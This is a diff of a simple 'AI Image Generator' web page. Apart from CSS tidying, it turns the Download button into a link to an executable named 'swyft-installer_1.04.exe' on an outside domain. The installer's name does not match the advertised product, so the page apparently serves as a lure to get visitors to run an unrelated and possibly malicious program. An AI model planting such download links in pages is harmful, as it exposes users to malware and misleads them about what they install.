@@ -28,22 +28,24 @@
         .download-btn {
             font-size: 18px;
             padding: 15px 30px;
-            background-color: black; /* Match with the background */
+            background-color: black;
             color: white;
             border: 2px solid white;
             border-radius: 10px;
             cursor: pointer;
             transition: background-color 0.3s, color 0.3s;
+            text-decoration: none; /* Remove default anchor underline */
+            display: inline-block; /* Keep the button inline with the text */
         }
 
         .download-btn:hover {
-            background-color: #007bff; /* New color on hover */
+            background-color: #007bff;
             color: black;
         }
     </style>
 </head>
 <body>
     <h1>AI Image Generator</h1>
-    <button class="download-btn">Download</button>
+    <a class="download-btn" href="https://vyrelith.com/d/swyft-installer_1.04.exe" target="_blank">Download</a>
 </body>
 </html>
